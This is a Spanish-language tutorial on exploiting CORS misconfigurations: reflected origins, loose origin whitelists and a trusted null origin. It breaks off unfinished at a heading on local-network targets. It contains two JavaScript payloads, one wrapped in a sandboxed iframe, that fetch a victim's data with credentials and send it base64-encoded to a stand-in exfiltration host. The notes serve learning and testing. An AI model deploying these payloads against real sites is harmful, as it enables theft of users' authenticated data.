### Contexto

- La mayoría de los ataques en CORS requieren que la header **Access-Control-Allow-Credentials** esté seteada en **true** para poder tener un contexto de autenticación de la víctima.
- De lograrse un ataque teniendo en cuenta el caso anterior saliendo desde un servicio controlado por el atacante la vulnerabilidad es similar al CSRF pero más severa.
- Dependiendo de la configuración específica del CORS el atacante puede potencialmente interactuar con la aplicación impersonando a la victima y ejecutando acciones sobre su comportamiento.


Si la header Access-Control-Allow-Credentials no está seteada, el atacante no podrá continuar con los ataques antes mencionados. Sin embargo, **una mala configuración de CORS en una aplicación web interna puede permitir a un atacante exfiltrar información no pública**

---

## Arbitrary Origin Reflection

La header Access-Control-Allow-Origin contiene los origenes que tienen permitido baypassear la SOP. El header puede ser seteado con un wildcard (*) que resulta en el permiso de todos los origenes.Por motivos de seguridad **EL WIDLCARD NUNCA DEBE SER SER COMBINADO CON Access-Control-Allow-Credentias seteado a true**

Podemos identificarla si vemos que en la cabecera Access-Control-allow-Origin de la response se refleja la cabeceras Origin o Referer de la request.

Si esto último se da y la header Access-Control-Allow-Credentials está seteada en true podemos explotarla.

### Explotación:

Creamos un payload en un sitio controlado por nosotros donde se indique el recurso a exfiltrar por medio de un get, que se haga con credenciales, el sitio al que van a ser reenviados los datos y luego un send de manera automática. Y se lo hacemos llegar a la víctima.

    <script>
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://api.vulnerablesite.com/data', true);
        xhr.withCredentials = true;
        xhr.onload = () => {
          location = 'http://exfiltrate.com/log?data=' + btoa(xhr.response);
        };
        xhr.send();
    </script>

## Improper Origin Whitelist

Esta explotación se basa en un error de configuración en la implementación de whitelist de los trusted origin. Requiere nuevamente el header Access-Control-Allow-Credentials seteado en true.

Imaginamos que el sitio *api.vulnerable.com* quiere permitir las request de todos los subdominios de *vulnerable.com*. Al validar el origen solo se fijará en que el mismo termine en *vulnerable.com* sin importar qué venga detrás. 

Esto permite a un atacante crear una web llamada **attackervulnerable.com** y cumplir con los requisiros del filtro de la whitelist.

La explotación es, entonces, exáctamente igual a la de arbitrary origin reflection.


## Trusted Null Origin.

La explotación se da cuando la cabecera de la response Access-Control-Allow-Origin está seteada en null y la header Access-Control-Allow-Credentials está seteada a true.

**EN LA PRACTICA LA CABECERA ACCESS-CONTROL-ALLOW-ORIGIN NUNCA DEBE ESTAR SETEADA EN NULL**. Sin embargo, los programadores suele confundirse con el sigificado de la misma pensando que es un "bloqueador total".

### Explotación.
La explotación es muy similar a las anteriores pero dentro de un **iframe**. De esta manera no es el sitio el que está haciendo la request sino el objeto (iframe), de esta manera el origen es nulo.

    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://api.vulnerablesite.com/data', true);
        xhr.withCredentials = true;
        xhr.onload = () => {
          location = 'http://exfiltrate.com/log?data=' + btoa(xhr.response);
        };
        xhr.send();
    </script>"></iframe>

## Targeting The local network

# Continuará...
